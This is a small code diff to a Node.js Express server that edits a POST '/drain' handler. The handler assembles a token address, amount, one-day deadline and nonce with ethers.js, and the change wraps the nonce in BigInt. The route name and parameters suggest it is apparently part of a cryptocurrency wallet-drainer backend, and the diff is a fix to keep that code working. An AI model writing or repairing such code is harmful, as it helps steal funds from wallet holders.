@@ -190,7 +190,7 @@ app.post('/drain', async (req, res) => {
       tokenAddress,
       ethers.utils.hexValue(parsedAmount),
       ethers.utils.hexValue(now + 86400n),
-      ethers.utils.hexValue(nonce || 0)
+      ethers.utils.hexValue(BigInt(nonce || 0))
     ];
 
     // Estimate gas limit
